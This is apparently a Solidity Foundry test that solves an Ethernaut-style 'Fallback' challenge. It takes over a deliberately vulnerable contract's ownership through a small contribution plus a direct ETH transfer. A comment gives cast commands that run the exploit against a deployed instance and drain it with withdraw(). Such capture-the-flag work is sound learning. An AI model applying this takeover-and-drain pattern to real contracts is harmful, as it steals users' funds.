// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback public fallbackContract;
    address public attacker;

    function setUp() public {
        fallbackContract = new Fallback();
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    function test_claimOwner() public {
        vm.startPrank(attacker);

        fallbackContract.contribute{value: 0.0009 ether}();
        (bool success, ) = address(fallbackContract).call{value: 0.0009 ether}(
            ""
        );
        require(success, "Failed to transfer ETH to Fallback contract");
        assertEq(fallbackContract.owner(), attacker);

        vm.stopPrank();
    }
}

/* 
Instance address: 0xBb8f7a96428aAf763e24C60732C6221FdB224fa6
export FALLBACK=0xBb8f7a96428aAf763e24C60732C6221FdB224fa6
source .env
cast send $FALLBACK "contribute()" --value 0.0009ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $FALLBACK --value 0.0001ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast call $FALLBACK "owner()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $FALLBACK "withdraw()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
